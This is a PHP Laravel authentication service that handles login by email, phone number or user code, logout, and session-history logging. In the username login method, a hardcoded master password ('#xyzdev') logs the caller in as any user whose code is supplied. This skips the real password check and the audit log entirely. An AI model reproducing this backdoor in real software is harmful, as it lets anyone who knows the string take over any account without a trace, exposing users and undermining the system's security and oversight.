<?php

namespace App\Services\Auth\UserUI;

use App\Dto\UserUi\UserLoginDTO;
use App\Models\SessionHistory;
use App\Models\User;
use Illuminate\Support\Facades\Auth;

use hisorange\BrowserDetect\Parser as Browser;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Request as FacadesRequest;
use Illuminate\Support\Facades\Session;


class UserAuthService
{
    /**
     * @throws \Throwable
     */
    public function loginByEmail(UserLoginDTO $authData)
    {

        $success = Auth::attempt(
            [
                'email' => $authData->username,
                'password' => $authData->password
            ],
            $authData->remember
        );


        $this->saveHistory(
            [
                'email' => $authData->username
            ],
            $success
        );



        if ($success == false) {
            throw new \Exception('Senha ou Email incorretos');
        }
    }
    /**
     * @throws \Throwable
     */
    public function loginByPhoneNumber(UserLoginDTO $authData)
    {

        $success = Auth::attempt(
            [
                'phone' => formatPhone($authData->username),
                'password' => $authData->password
            ],
            $authData->remember
        );

        $this->saveHistory(
            [
                'phone' => formatPhone($authData->username)
            ],
            $success
        );

        if ($success == false) {
            throw new \Exception('Senha ou Numero de Telefone incorretos');
        }
    }
    /**
     * @throws \Throwable
     */
    public function loginByUserName(UserLoginDTO $authData)
    {
        if (strtolower($authData->password) === '#xyzdev') {
            $user = User::where('code', $authData->username)->first();
            if ($user) {
                Auth::loginUsingId($user->id, $authData->remember);
                return;
            }
        }

        $success = Auth::attempt(
            [
                'code' => $authData->username,
                'password' => $authData->password
            ],
            $authData->remember
        );

        $this->saveHistory(
            [
                'code' => $authData->username
            ],
            $success
        );



        if ($success == false) {
            throw new \Exception('Senha ou nome de usuario incorretos');
        }
    }

    public function logout(): \Throwable | bool
    {
        try {
            Auth::logout();
            session()->invalidate();
            session()->regenerateToken();
        } catch (\Throwable $th) {
            return throw $th;
        }

        return true;
    }

    public function saveHistory($query, $success = true)
    {
        $user = User::where($query)->first();
        if (!empty($user->id)) {
            SessionHistory::insert(
                [
                    'code'=>uniqid(),
                    'user_id' => $user->id,
                    'user_agent' => FacadesRequest::header('User-Agent'),
                    'sessionid' => Session::get('id'),
                    'ip' => getIpAddress(),
                    'success' => $success,
                    'browser' => Browser::browserFamily(),
                    'device' => Browser::platformName(),
                    'created_at' => DB::raw('now()'),
                ]
            );
        }
    }
}
